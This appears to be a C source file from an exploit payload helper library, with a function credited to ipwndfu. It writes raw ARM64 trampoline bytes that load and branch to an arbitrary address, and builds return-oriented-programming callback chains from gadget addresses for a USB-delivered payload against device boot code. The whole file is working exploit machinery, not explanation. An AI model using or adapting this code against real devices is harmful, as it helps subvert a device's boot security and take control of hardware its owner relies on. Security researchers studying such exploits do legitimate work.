#include <exploit/payloads/helpers.h>

// ipwndfu function
void asm_arm64_x7_trampoline(uint64_t address, uint8_t *destination)
{
    assert (address != 0);
    assert (address <= 0xFFFFFFFFFFFFFFFF);

    uint8_t trampoline[16];
    
    // LDR X7, [PC, #OFFSET]
    trampoline[0] = 0x47;
    trampoline[1] = 0x00;
    trampoline[2] = 0x00;
    trampoline[3] = 0x58;
    trampoline[4] = 0xE0;
    trampoline[5] = 0x00;
    trampoline[6] = 0x1F;
    trampoline[7] = 0xD6;

    address = CFSwapInt64HostToLittle(address);
    memcpy(&trampoline[8], &address, 8);

    memcpy(destination, trampoline, 16);

    return;
}

size_t generateUSBROPCallbacks(uint8_t *buffer, uint64_t address, callback_t *callbacks, size_t callbackCount) {
    uint8_t block0[MAX_BLOCK_SIZE], block1[MAX_BLOCK_SIZE];
    size_t i, j, size = 0, block0Size, block1Size;
    uint64_t reg;

    for (i = 0; i < callbackCount; i += 5) {
        block1Size = block0Size = 0;
        for (j = 0; j < 5; j++) {
            address += MAX_BLOCK_SIZE / 5;
            if (j == 4) {
                address += MAX_BLOCK_SIZE;
            }
            if (i + j < callbackCount - 1) {
                reg = func_gadget;
                memcpy(block0 + block0Size, &reg, sizeof(reg));
                block0Size += sizeof(reg);
                reg = address;
                memcpy(block0 + block0Size, &reg, sizeof(reg));
                block0Size += sizeof(reg);
                reg = callbacks[i + j].arg;
                memcpy(block1 + block1Size, &reg, sizeof(reg));
                block1Size += sizeof(reg);
                reg = callbacks[i + j].func;
                memcpy(block1 + block1Size, &reg, sizeof(reg));
                block1Size += sizeof(reg);
            } else if (i + j == callbackCount - 1) {
                reg = func_gadget;
                memcpy(block0 + block0Size, &reg, sizeof(reg));
                block0Size += sizeof(reg);
                reg = 0;
                memcpy(block0 + block0Size, &reg, sizeof(reg));
                block0Size += sizeof(reg);
                reg = callbacks[i + j].arg;
                memcpy(block1 + block1Size, &reg, sizeof(reg));
                block1Size += sizeof(reg);
                reg = callbacks[i + j].func;
                memcpy(block1 + block1Size, &reg, sizeof(reg));
                block1Size += sizeof(reg);
            } else {
                reg = 0;
                memcpy(block0 + block0Size, &reg, sizeof(reg));
                block0Size += sizeof(reg);
                reg = 0;
                memcpy(block0 + block0Size, &reg, sizeof(reg));
                block0Size += sizeof(reg);
            }
        }
        memcpy(buffer + size, block0, block0Size);
        size += block0Size;
        memcpy(buffer + size, block1, block1Size);
        size += block1Size;
    }
    return size;
}